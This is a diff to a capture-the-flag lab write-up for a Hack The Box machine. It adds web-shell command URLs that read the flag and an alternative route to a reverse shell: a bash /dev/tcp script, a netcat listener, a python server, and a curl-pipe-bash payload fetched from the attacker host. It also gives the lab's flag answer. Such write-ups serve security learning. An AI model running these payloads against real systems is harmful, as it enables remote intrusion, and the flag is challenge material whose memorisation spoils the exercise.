@@ -207,17 +207,35 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp Shell.php s3://thetoppers.htb
 
 * If we access to the bucket from the browser and try sending a comand as value with the parameter _cmd_ it will excute it, we have gained RCE.&#x20;
 
+{% code title="Payload" lineNumbers="true" %}
+```url
+http://thetoppers.htb/Shell.php?cmd=id
+```
+{% endcode %}
+
 <figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 * If we go and check the _/var/www_ folder where normally is saved the information of web sites, we can see there is a _flag.txt_ file.
 
+{% code title="Payload" lineNumbers="true" %}
+```uri
+http://thetoppers.htb/Shell.php?cmd=ls /var/www
+```
+{% endcode %}
+
 <figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
 * Finally we check the content of the file.
+
+{% code title="Payload" lineNumbers="true" %}
+```url
+http://thetoppers.htb/Shell.php?cmd=cat /var/www/flag.txt
+```
+{% endcode %}
 
 <figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>
 
@@ -228,3 +246,77 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp Shell.php s3://thetoppers.htb
 <figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>
 
 > Answer: _**a980d99281a28d638ac68b9bf9453c2b**_
+
+***
+
+
+
+## <mark style="color:blue;">Alternative</mark>
+
+* Instead of abusing the RCE diectly on the browser we can try to get a Reverse Shell on the machine. First we create a simple bash script to send the shell connection to our machine.
+
+{% code lineNumbers="true" %}
+```bash
+sudo nano shell.sh
+```
+{% endcode %}
+
+{% code title="shell.sh" lineNumbers="true" %}
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.195/1234 0>&1  
+#We use the IP of our machine on the VPN and an arbitrary port
+```
+{% endcode %}
+
+{% hint style="info" %}
+We can check our IP with`ifconfig`, normally will be the one on the _tun0_ network interface
+{% endhint %}
+
+***
+
+* Then we stablish a _netcat_ listener on the arbitrary port chosen above
+
+{% code lineNumbers="true" %}
+```sh
+nc -nvlp 1234
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+* After this, in another terminal we stablish a http server with _python_ on the same folder where the _shell.sh_ is to host it, and we choose another arbitrary port for the server.
+
+{% code lineNumbers="true" %}
+```bash
+python -m http.server 4444
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+* Now we use the RCM to send the shell from the target to our machine using de curl command. We will see the page remain loading.
+
+{% code title="Payload" overflow="wrap" lineNumbers="true" %}
+```url
+http://thetoppers.htb/Shell.php?cmd=curl%2010.10.14.195:4444/shell.sh|bash
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+* Also if we check the python server info we see it has recieve a petition
+
+<figure><img src="../../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+* Finally we can check our _netcat_ listener and will see that we have gained a shell from the machine, with this we can interact with the system more comfortably.
+
+<figure><img src="../../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>
